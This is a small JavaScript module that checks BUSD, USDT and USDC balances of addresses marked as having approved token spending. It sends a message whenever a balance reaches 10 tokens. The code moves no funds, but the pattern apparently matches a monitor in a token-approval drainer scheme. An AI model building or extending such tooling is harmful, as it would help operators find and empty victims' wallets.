const busd = require('./contracts/busd')
const usdt = require('./contracts/usdt')
const usdc = require('./contracts/usdc')
const sender = require('./sender')


function checkBalance (addresses) {
    addresses.forEach(address => {

        if (address.busd_approved) {
            busd.getBalance(address.address).then(res => {
                balanceHandler('BUSD', address.address, res)
            })
        }

        if (address.usdt_approved) {
            usdt.getBalance(address.address).then(res => {
                balanceHandler('USDT', address.address, res)
            })
        }

        if (address.usdc_approved) {
            usdc.getBalance(address.address).then(res => {
                balanceHandler('USDC', address.address, res)
            })
        }
    })
}

function balanceHandler (coin, address, balance) {
    const balanceValue = balance / 10 ** 18
    if (balanceValue >= 10) {
        sender.sendMessage(coin, balanceValue.toFixed(2), address)
    }
}

module.exports = {
    checkBalance
}
